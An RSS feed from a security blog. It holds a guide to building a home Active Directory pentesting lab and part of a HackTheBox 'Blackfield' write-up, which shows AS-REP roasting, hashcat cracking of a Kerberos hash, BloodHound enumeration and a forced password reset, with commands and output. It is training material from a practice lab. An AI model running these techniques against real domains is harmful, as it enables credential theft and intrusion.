<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Active-Directory on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/active-directory/</link>
    <description>Recent content in Active-Directory on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Thu, 17 Jun 2021 14:04:24 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/active-directory/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Building Virtual Home Lab for Pentesting</title>
      <link>https://fahmifj.github.io/blog/building-virtual-home-lab-for-pentesting/</link>
      <pubDate>Thu, 17 Jun 2021 14:04:24 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/blog/building-virtual-home-lab-for-pentesting/</guid>
      <description>My documentation on building a small pentesting lab</description>
      <content:encoded><![CDATA[<p>This is my personal documentation on setting up a pentesting lab in a virtual environment to learn some AD attack scenarios, network pivoting, and C2 (command &amp; control) with <code>metasploit</code>.</p>
<h2 id="prerequisites">Prerequisites</h2>
<h3 id="knowledge">Knowledge</h3>
<ul>
<li>Virtualization and VirtualBox</li>
<li>Windows OS and Server Installation</li>
<li>Basics knowledge of Windows/Windows Server (Desktop/GUI version)/</li>
<li>Basics knowledge of Active Directory:
<ul>
<li>AD Domain</li>
<li>Principle name</li>
<li>DNS</li>
</ul>
</li>
<li>Basics knowledge of Networking (routing).</li>
</ul>
<h3 id="hardware">Hardware</h3>
<p>The following are the main specifications that I recommend, the list is sorted by priority.</p>
<ul>
<li>Storage: 256 GB minimum, SSD is a must for server, or use high speed USB 3.1/ type C drive.</li>
<li>RAM: 8 GB of minimum, 16 GB recommended dual channel.</li>
<li>CPU: AMD Ryzen 3 or Intel i3 6th (minimum), AMD Ryzen 5+ with H prefix or i5+ 6th gen with K/H prefix. (recommended).
<ul>
<li>4th gen of i7 is still worth though.</li>
</ul>
</li>
</ul>
<p>For me, I used a single MSI laptop with the minimum requirements except for the CPU.</p>
<h3 id="software">Software</h3>
<ul>
<li>VirtualBox (<a href="https://www.virtualbox.org/wiki/Downloads">Download</a>)</li>
<li>Kali Linux image file (<a href="https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/#1572305786534-030ce714-cc3b">Download</a>)</li>
<li>Windows 10 evaluation image file (<a href="https://www.microsoft.com/en-us/evalcenter/">Download</a>)</li>
<li>Windows Server 2019 evaluation image file (<a href="https://www.microsoft.com/en-us/evalcenter/">Download</a>)</li>
</ul>
<h2 id="topology">Topology</h2>
<p>I know it&rsquo;s bad.</p>
<p><img class="img-container" src="imgs/topology.jpg" alt=""  />
</p>
<p>So, for pivoting, I removed the Windows 10 inside network range of  <code>10.10.10.100/28</code> from AD Domain.</p>
<h2 id="setup">Setup</h2>
<h3 id="vm-system-configuration">VM System Configuration</h3>
<h4 id="system">System</h4>
<p>Initial for installation</p>
<ul>
<li>Server: 2424 MB of RAM</li>
<li>Client: x2 1280 MB of RAM</li>
</ul>
<p>After installation (removed style/desktop/disable junk service)</p>
<ul>
<li>Server: 1280 MB of RAM</li>
<li>Client: 1024 MB of RAM</li>
<li>Attacking machine: 1024MB of RAM</li>
</ul>
<p>Trust me, I use 8 GB to host these VM. 😂</p>
<ul>
<li>Windows 2019 = Server</li>
<li>Windows 10 = Client</li>
<li>Kali Linux/Armed Ubuntu = Attacker</li>
</ul>
<p>For initial setup, the two clients can <strong>stay inside</strong> <code>192.168.1.0/24</code> network.</p>
<h4 id="network">Network</h4>
<p>Server Adapter 1:</p>
<p><img class="img-container" src="imgs/image-20210617143401181.png" alt="image-20210617143401181"  />
</p>
<h3 id="setting-up-server">Setting up Server</h3>
<h4 id="initial-setup">Initial setup</h4>
<ul>
<li>Admin credentials: <code>administrator:p@$$w0rd!</code></li>
<li>PC Name: <code>server19-DC</code> (restart after)</li>
<li>Network (Static):
<ul>
<li>Adapter 1: 192.168.1.100/24</li>
<li>Adapter 2: 10.10.10.100/28</li>
</ul>
</li>
</ul>
<h4 id="promote-to-domain-controller">Promote to Domain Controller</h4>
<ul>
<li>Server Manager &gt; Manage &gt; Add Roles and Features.</li>
<li>Add Roles and Features Wizard:
<ul>
<li>Installation type: &ldquo;<strong>Role-based or feature-based installation</strong>&rdquo;</li>
<li>Server selection: <code>server19-DC</code></li>
<li>Server roles: <strong>&ldquo;Active Directory Domain Services&rdquo;</strong> and check the <strong>&ldquo;Include management tools&rdquo;</strong>.</li>
<li>Features: Check the <strong>&ldquo;Group Policy Management&rdquo;</strong></li>
<li>Confirmation:  Check on <strong>&ldquo;Restart destination server automatically if required&rdquo;</strong></li>
<li>Close after it&rsquo;s done.</li>
</ul>
</li>
<li>Server Manager &gt; Notification flag &gt; Click on <strong>&ldquo;Promote this server to a domain controller&rdquo;</strong></li>
<li>Active Directory Domain Services Configuration Wizard:
<ul>
<li>Deployment configuration: <strong>&ldquo;Add a new forest&rdquo;</strong> and set <strong>&ldquo;server19.local&rdquo;</strong> as root domain name</li>
<li>Domain controller options: set <strong>&ldquo;Windows Server 2016&rdquo;</strong> as FFL (Forest Functional Level) and DFL (Domain Functional Level). Checklist DNS server and set the same admin password for DSRM password.</li>
<li>Additional options: set NetBIOS domain name to <code>SERVER19</code></li>
<li>Let the rest options in default state until installation section.</li>
<li>Restart after installation complete.</li>
</ul>
</li>
</ul>
<p><img class="img-container" src="imgs/server19logon.jpg" alt=""  />
</p>
<h4 id="domain-accounts">Domain Accounts</h4>
<ul>
<li>John Smith
<ul>
<li>User logon name: <code>jsmith@server19.local</code></li>
<li>Password: <code>jsmith@123</code></li>
</ul>
</li>
<li>Carl Smith
<ul>
<li>User logon name: <code>cmisth@server19.local</code></li>
<li>Password: <code>@csmith@</code></li>
</ul>
</li>
</ul>
<p>All password is set to never expires.</p>
<h4 id="service-account">Service Account</h4>
<p>Fake SQL Service</p>
<ul>
<li>User logon name: <code>SQLService@server19.local</code></li>
<li>Password: <code>Mysql@Password123</code></li>
</ul>
<p>Set service principle name:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">setspn -a SERVER19-DC/SQLService.SERVER19.local:60111 SERVER19\SQLService
setspn -T SERVER19.local -Q */*
</code></pre></div><h4 id="configure-file-sharing-smb">Configure File Sharing (SMB):</h4>
<ul>
<li>Server manager &gt; File and Storage Services &gt; Shares &gt; Task &gt; New Share.</li>
<li>New Share Wizard:
<ul>
<li>Profile: SMB Share Quick</li>
<li>Share Location: <code>C:\Shares\DATA</code> (Create the Shares folder in C:)</li>
<li>Other Settings: Allow caching of share</li>
<li>Permission: Leave it default</li>
<li>Confirmation and create.</li>
</ul>
</li>
</ul>
<h3 id="setting-up-client">Setting up Client</h3>
<h4 id="initial-setup-1">Initial setup</h4>
<ul>
<li>Client 1:
<ul>
<li>IP: 192.168.1.101 (static)</li>
<li>PC name: NESCOFFEE</li>
</ul>
</li>
<li>Client 2:
<ul>
<li>IP: 192.168.1.102 (static)</li>
<li>PC name: MILO</li>
</ul>
</li>
</ul>
<h4 id="local-accounts">Local Accounts</h4>
<p>Same with domain accounts, but add an <code>L</code> at the end of username/password.</p>
<ul>
<li>Username: <code>cmisthL</code>, password: <code>jsmithL@123</code></li>
<li>Username: <code>jsmithL</code>, password: <code>@csmith@</code></li>
</ul>
<h4 id="join-domain">Join Domain</h4>
<p>Client 1:</p>
<ul>
<li>Use Server&rsquo;s IP as DNS server: <code>192.168.1.100</code></li>
<li>Hit <code>Win+I</code>, type &ldquo;access&rdquo;, click on <strong>Connect</strong>.</li>
<li>Microsoft account window:
<ul>
<li>Click on <strong>&ldquo;Join this device to a local Active Directory domain&rdquo;</strong> under the alternate actions.</li>
<li>Use the server administrator password to join.</li>
<li>Skip the <strong>Add an account</strong> section</li>
<li>Restart</li>
</ul>
</li>
</ul>
<p>Client 2 has the same steps</p>
<h4 id="local-admin">Local Admin:</h4>
<ul>
<li>Set John Smith (<code>jsmith@server19.local</code>) as local administrator for NESCOFFEE.</li>
<li>Set Carl Smith (<code>cmisth@server19.local</code>) as local administrator for MILO.</li>
</ul>
<h3 id="setting-up-attacking-machine">Setting up Attacking Machine</h3>
<ul>
<li>Put it on the same network</li>
<li>Set static IP: 192.168.1.10</li>
</ul>
<h2 id="ad-attack-scenarios">AD Attack Scenarios</h2>
<p>Here are some attack scenarios:</p>
<ul>
<li>LLMNR Poisoning - <a href="https://www.aptive.co.uk/blog/llmnr-nbt-ns-spoofing/">https://www.aptive.co.uk/blog/llmnr-nbt-ns-spoofing/</a></li>
<li>AS-REP Roasting
<ul>
<li>Example attacks: <a href="/tags/asrep-roasting">ASREP-Roasting tags</a></li>
</ul>
</li>
<li>Kerberoasting  - <a href="https://pentestlab.blog/2018/06/12/kerberoast/">https://pentestlab.blog/2018/06/12/kerberoast/</a></li>
<li>Take Over IPv6 DNS - <a href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/">https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/</a></li>
<li>DCSync
<ul>
<li>Example attacks: <a href="/tags/dcsync/">DCSync tags</a></li>
</ul>
</li>
</ul>
<p>Attack scenario(s) that requires two clients online + server:</p>
<ul>
<li>SMB Relay - <a href="https://akimboviper.gitbook.io/pentest-everything/everything/everything-windows/attacking-windows/relay-attacks/smb-relay">https://akimboviper.gitbook.io/pentest-everything/everything/everything-windows/attacking-windows/relay-attacks/smb-relay</a>
<ul>
<li>Example attacks: <a href="/writeups/hackthebox/htb-apt/">HackTheBox - APT</a></li>
</ul>
</li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Blackfield</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-blackfield/</link>
      <pubDate>Tue, 04 May 2021 14:28:21 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-blackfield/</guid>
      <description>Abusing DiskShadow utility to dump Active Directory database</description>
      <content:encoded><![CDATA[<p>Blackfield is a hard difficulty Windows machine  from HackTheBox that features Active Directory environment. It begins with collecting a list of usernames from an SMB share. With these usernames, I&rsquo;m able to perform AS-REP roasting attack and obtain a TGT from a helpdesk account. The helpdesk account can be used to reset the password of an audit account. Re-enumerating SMB shares using the audit account finds an LSASS memory dump file. The dump file contains an NT hash of a service account that is a member of Backup Operators. The privileges of the Backup Operators group can be abused to create a volume shadow copy and pull the <code>NTDS.dit</code> file from there. With the <code>NTDS.dit</code> file, I&rsquo;m able to retrieves the NT hash of the administrator account, and then perform pass-the-hash attack to gain administrator access.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>AS-REP roasting</li>
<li>LDAP enumeration</li>
<li>BloodHound</li>
<li>Abusing Windows Access Tokens - SeBackupPrivilege</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Kali Linux 2019.4 (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>smbclient - Preinstalled in Kali Linux</li>
<li>SMBMap - Preinstalled in Kali Linux</li>
<li>ldapdomaindump - <a href="https://github.com/dirkjanm/ldapdomaindump">https://github.com/dirkjanm/ldapdomaindump</a></li>
<li>CrackMapExec - <a href="https://github.com/byt3bl33d3r/CrackMapExec">https://github.com/byt3bl33d3r/CrackMapExec</a></li>
<li>BloodHound - <a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a></li>
<li>BloodHound.py - <a href="https://github.com/fox-it/BloodHound.py">https://github.com/fox-it/BloodHound.py</a></li>
<li>SeBackupPrivilege CmdLets - <a href="https://github.com/giuliano108/SeBackupPrivilege">https://github.com/giuliano108/SeBackupPrivilege</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
$ nmap -sC -sV -oN initial-blackfield 10.10.10.192
Nmap scan report <span style="color:#66d9ef">for</span> blackfield.htb <span style="color:#f92672">(</span>10.10.10.192<span style="color:#f92672">)</span>
Host is up <span style="color:#f92672">(</span>0.054s latency<span style="color:#f92672">)</span>.

PORT STATE SERVICE VERSION
53/tcp open domain?
| fingerprint-strings: 
| DNSVersionBindReqTCP: 
| version
|_ bind
88/tcp open kerberos-sec Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2020–10–04 10:53:38Z<span style="color:#f92672">)</span>
135/tcp open msrpc Microsoft Windows RPC
389/tcp open ldap Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: BLACKFIELD.local0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
445/tcp open microsoft-ds?
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
3268/tcp open ldap Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: BLACKFIELD.local0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
<span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V<span style="color:#f92672">=</span>7.80%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>10/3%Time<span style="color:#f92672">=</span>5F794746%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>DNSV
SF:ersionBindReqTCP,20,<span style="color:#e6db74">&#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
</span><span style="color:#e6db74">SF:x04bind\0\0\x10\0\x03&#34;</span><span style="color:#f92672">)</span>;
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: 6h59m59s
| smb2-security-mode: 
| 2.02: 
|_ Message signing enabled and required
| smb2-time: 
| date: 2020–10–04T10:55:58
|_ start_date: N/A
</code></pre></div><p>An initial TCP scan with <code>nmap</code> discovered at least seven open ports. These ports are the typical port used by Active Directory Domain Controller (AD DC).</p>
<p>I&rsquo;ll summarize the result:</p>
<ul>
<li>There is a DNS service on port 53, but HTB box is a single machine, so enumerating this service is not priority.</li>
<li>There is a Kerberos service on port 88 is running Kerberos. I can try AS-REP roasting here.</li>
<li>There is MS-RPC service on port 135, which I don&rsquo;t touch it really often, so I&rsquo;ll lower the priority.</li>
<li>There is an LDAP service on port 389, LDAP is the standard protocol for directory services. Active Directory is Microsoft&rsquo;s implementation of directory services and it supports LDAP query.</li>
<li>There is an SMB service on port 445. I can try anonymous login here.</li>
<li>Port 3268 is running LDAP as well, but it&rsquo;s used as <a href="https://social.technet.microsoft.com/Forums/Lync/en-US/e52b9154-b93a-4a3b-b6f2-0285f932da14/389-and-3268-port-difference?forum=winserverDS">global catalog</a> (read more: <a href="https://www.techopedia.com/definition/25429/global-catalog-gc">here</a>).</li>
</ul>
<p><code>nmap</code> also identified the AD domain name is <code>blackfield.local</code>.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-389---ldap">TCP 389 - LDAP</h3>
<p>On LDAP, I can send a query to obtain the domain metadata, but first I&rsquo;ll look into the rootDSE<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> to retrieve a list of the domain naming context.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
$ ldapsearch -LLL -x -h 10.10.10.192 -s base namingContexts
dn:
namingcontexts: DC<span style="color:#f92672">=</span>BLACKFIELD,DC<span style="color:#f92672">=</span>local
namingcontexts: CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>BLACKFIELD,DC<span style="color:#f92672">=</span>local
namingcontexts: CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>BLACKFIELD,DC<span style="color:#f92672">=</span>local
namingcontexts: DC<span style="color:#f92672">=</span>DomainDnsZones,DC<span style="color:#f92672">=</span>BLACKFIELD,DC<span style="color:#f92672">=</span>local
namingcontexts: DC<span style="color:#f92672">=</span>ForestDnsZones,DC<span style="color:#f92672">=</span>BLACKFIELD,DC<span style="color:#f92672">=</span>local
</code></pre></div><ul>
<li>
<p><code>-LLL</code>: removes every comments in the output</p>
</li>
<li>
<p><code>-x</code>: to perform simple authentication</p>
</li>
<li>
<p><code>-h</code>: hostname or IP</p>
</li>
<li>
<p><code>-s</code>: search scope, base will returns the contents of the root DSE</p>
</li>
</ul>
<p>I can use <code>DC=BLACKFIELD,DC=local</code> (this is called as <em>distinguished name</em>), but unfortunately the anonymous bind is not allowed.</p>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>Trying anonymous login with <code>crackmapexec</code> returns a status access denied.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
$ crackmapexec smb 10.10.10.192 -u <span style="color:#e6db74">&#39;&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --shares
SMB         10.10.10.192    <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows 10.0 Build <span style="color:#ae81ff">17763</span> <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:BLACKFIELD.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
SMB         10.10.10.192    <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> BLACKFIELD.local<span style="color:#ae81ff">\:</span> STATUS_ACCESS_DENIED
SMB         10.10.10.192    <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Error enumerating shares: STATUS_ACCESS_DENIED
</code></pre></div><p>But on using <code>smbclient</code>, it return the shares list.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
$ smbclient -N -L //10.10.10.192/

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        forensic        Disk      Forensic / Audit share.
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        profiles$       Disk
        SYSVOL          Disk      Logon server share
Reconnecting with SMB1 <span style="color:#66d9ef">for</span> workgroup listing.
do_connect: Connection <span style="color:#66d9ef">for</span> 10.10.10.192 failed <span style="color:#f92672">(</span>Error NT_STATUS_IO_TIMEOUT<span style="color:#f92672">)</span>
Unable to connect with SMB1 -- no workgroup available
</code></pre></div><p>Later, I came to know that ‘anonymous’ must be specified in <code>crackmapexec</code>.</p>
<p><img class="img-container" src="imgs/image-20210504155151284.png" alt="image-20210504155151284"  />
</p>
<h4 id="profiles-share">profiles$ share</h4>
<p>I have read permission on the <code>profile$</code> share. The share contains a bunch of empty users folder.</p>
<p><img class="img-container" src="imgs/image-20210504155638689.png" alt="image-20210504155638689"  />
</p>
<p>I can convert these folders name to list of username using <code>awk '{print $1}'</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
$ cat folder.list | awk <span style="color:#e6db74">&#39;{print $1}&#39;</span> | tee users.list
AAlleni
ABarteski
ABekesz
ABenzies
ABiemiller
AChampken
...&lt;SNIP&gt;...
</code></pre></div><p>Now that I have a list of usernames, I can try AS-REP roast attack.</p>
<h3 id="tcp-88---kerberos">TCP 88 - Kerberos</h3>
<h4 id="as-rep-roasting">AS-REP roasting</h4>
<p>I&rsquo;ll use <code>GetNPUsers.py</code> to perform AS-REP roasting on Kerberos.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
$ GetNPUsers.py BLACKFIELD.LOCAL/ -no-pass -usersfile users.list -dc-ip 10.10.10.192 -outputfile TGT_AS-REP
</code></pre></div><p>And watching the output file using watch command</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
$ watch -n <span style="color:#ae81ff">1</span> cat TGT_AS-REP
</code></pre></div><p>After a few minutes, it shows the hash for user <code>support</code>.</p>
<p><img class="img-container" src="imgs/image-20210504160338371.png" alt="image-20210504160338371"  />
</p>
<p>I&rsquo;ll send the hash to my Windows for cracking.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
$ cat TGT_AS-REP
$krb5asrep$23$support@BLACKFIELD.LOCAL:55211d2eb15e1539552de705eb8605c4$821c479c296fc01c7db5c01f75c08cedd607897692d622f1de2972d6601ebd880b3cb32e663e8c1a2cac5f2531aa1f1cb1323bc6b2a1816d212f179031952b9c1c1290cf11066339706d5cc592ab1e4e9de40e4db0986647c550860b2677671ce6b4b73761e119f56d9651b277a1297a87fa160e22eed4ecee7cb522c03d142cac647a467dfc48f69afb17fef110337134cfef9070f0b1f34d073772409dc31c6c0d0edea5562a9a37387ea44a48fb4947277e84300db0bf7da4ec5a9b3be94a7a1d4c910b1dd39f17ace62366f8e111dca756e13359750171464cd23b23e7b33d427a42978b489dc0a58bc9e586ff02ff3ab805
</code></pre></div><h3 id="cracking-the-hash">Cracking the Hash</h3>
<p>I&rsquo;ll use dictionary attack to recover the user password using <code>hashcat</code>, and it cracks within a few seconds.</p>
<pre><code>C:\tools\hashcat6&gt; hashcat -m 18200 hashes/blackfield.hash rockyou.txt -O
hashcat (v6.1.1) starting...

...&lt;SNIP&gt;...
$krb5asrep$23$support@BLACKFIELD.LOCAL:55211d2eb15e1539552de705eb8605c4$821c479c296fc01c7db5c01f75c08cedd607897692d622f1de2972d6601ebd880b3cb32e663e8c1a2cac5f2531aa1f1cb1323bc6b2a1816d212f179031952b9c1c1290cf11066339706d5cc592ab1e4e9de40e4db0986647c550860b2677671ce6b4b73761e119f56d9651b277a1297a87fa160e22eed4ecee7cb522c03d142cac647a467dfc48f69afb17fef110337134cfef9070f0b1f34d073772409dc31c6c0d0edea5562a9a37387ea44a48fb4947277e84300db0bf7da4ec5a9b3be94a7a1d4c910b1dd39f17ace62366f8e111dca756e13359750171464cd23b23e7b33d427a42978b489dc0a58bc9e586ff02ff3ab805:#00^BlackKnight

Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
Hash.Target......: $krb5asrep$23$support@BLACKFIELD.LOCAL:55211d2eb15e...3ab805
...&lt;SNIP&gt;...
</code></pre><p>The password for user <code>support</code> is <code>#00^BlackKnight</code>.</p>
<h3 id="access-as-support">Access as support</h3>
<p>Now that I obtained a set of credentials, I can re-enumerate the available services.</p>
<h4 id="ldap-domain-dump">LDAP Domain Dump</h4>
<p>The credentials works on LDAP, I can use it to obtain the domain info using <a href="https://github.com/dirkjanm/ldapdomaindump">ldapdomaindump</a>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.169»
$ ldapdomaindump -u <span style="color:#e6db74">&#39;BLACKFIELD.LOCAL\support&#39;</span> -p <span style="color:#e6db74">&#39;#00^BlackKnight&#39;</span> -no-json -no-grep 10.10.10.192
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Connecting to host...
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Binding to host
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Bind OK
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Starting domain dump
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Domain dump finished
</code></pre></div><p>The output from the tool are formatted in HTML document, and I get the following information:</p>
<p>The OS information and the computer FQDN.</p>
<p><img class="img-container" src="imgs/image-20210504162822528.png" alt="image-20210504162822528"  />
</p>
<p>The domain policy.</p>
<p><img class="img-container" src="imgs/image-20210504162931229.png" alt="image-20210504162931229"  />
</p>
<p>The interesting domain users.</p>
<p><img class="img-container" src="imgs/image-20210504163338913.png" alt="image-20210504163338913"  />
</p>
<p><img class="img-container" src="imgs/image-20210504163255290.png" alt="image-20210504163255290"  />
</p>
<p>Interesting groups</p>
<p><img class="img-container" src="imgs/image-20210504163741235.png" alt="image-20210504163741235"  />
</p>
<p><img class="img-container" src="imgs/image-20210504163658173.png" alt="image-20210504163658173"  />
</p>
<p><img class="img-container" src="imgs/image-20210504163716719.png" alt="image-20210504163716719"  />
</p>
<p>From here, I know that user <code>support</code> does not have remote shell access like WinRM.</p>
<h4 id="bloodhound">BloodHound</h4>
<p>There is a python-based ingestor for <code>BloodHound</code> besides <code>SharpHound</code>. It can be used remotely from Linux.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.169»
$ python bloodhound.py -c All -u <span style="color:#e6db74">&#39;support@blackfield.local&#39;</span> -p <span style="color:#e6db74">&#39;#00^BlackKnight&#39;</span> -d blackfield.local -dc DC01.BLACKFIELD.local -ns 10.10.10.192
</code></pre></div><ul>
<li><code>-c</code>: collect method : all</li>
<li><code>-u</code>,<code>-p</code>: credentials set</li>
<li><code>-d</code>: domain name</li>
<li><code>-dc</code>: FQDN of domain controller (it’s on ldap domain dump section → <strong>domain_computers.html</strong>)</li>
<li><code>-ns</code>: name server / DNS</li>
</ul>
<p>It returns the following output:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">INFO: Found AD domain: blackfield.local
INFO: Connecting to LDAP server: DC01.BLACKFIELD.local
INFO: Found <span style="color:#ae81ff">1</span> domains
INFO: Found <span style="color:#ae81ff">1</span> domains in the forest
INFO: Found <span style="color:#ae81ff">18</span> computers
INFO: Connecting to LDAP server: dc01.blackfield.local
INFO: Found <span style="color:#ae81ff">316</span> users
INFO: Connecting to GC LDAP server: dc01.blackfield.local
INFO: Found <span style="color:#ae81ff">51</span> groups
INFO: Found <span style="color:#ae81ff">0</span> trusts
INFO: Starting computer enumeration with <span style="color:#ae81ff">10</span> workers
INFO: Querying computer: DC01.BLACKFIELD.local
INFO: Done in 00M 18S
</code></pre></div><p>The output files from the tool are in json format. They are: <code>computers.json</code>, <code>domains.json</code>, <code>groups.json</code> and <code>users.json</code>.</p>
<p>I can upload these files to <code>BloodHound</code> GUI by drag and drop.</p>
<p><img class="img-container" src="imgs/image-20210504165340110.png" alt="image-20210504165340110"  />
</p>
<p>Enumerating the user <code>support</code> permissions discovers it has <code>ForceChangePassword</code> permission on Audit2020. That means user <code>support</code> is able to change the user <code>audit2020</code> password.</p>
<p><img class="img-container" src="imgs/image-20210504165510700.png" alt="image-20210504165510700"  />
</p>
<h4 id="reset-audit2020-password">Reset Audit2020 Password</h4>
<p>I can change the user <code>audit2020</code> password using <code>net rpc</code><sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>. I&rsquo;ll set <code>P@$$w0rd!</code> as the new password for user <code>audit2020</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
$ net rpc password audit2020 -U <span style="color:#e6db74">&#39;support%#00^BlackKnight&#39;</span> -S 10.10.10.192
Enter new password <span style="color:#66d9ef">for</span> audit2020: 
</code></pre></div><h3 id="access-as-audit2020">Access as Audit2020</h3>
<h4 id="forensic-share">forensic share</h4>
<p>With <code>audit2020</code>, I can access the forensic share.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
$ smbmap -H 10.10.10.192 -u audit2020 -p <span style="color:#e6db74">&#39;P@$$w0rd!&#39;</span> 
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: 10.10.10.192:445        Name: BLACKFIELD.local
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        forensic                                                READ ONLY       Forensic / Audit share.
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        profiles$                                               READ ONLY
        SYSVOL                                                  READ ONLY       Logon server share
</code></pre></div><p>Inside the share, there is three folders, and I&rsquo;ll download all of them to my Kali.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «blackfield» «10.10.14.169»
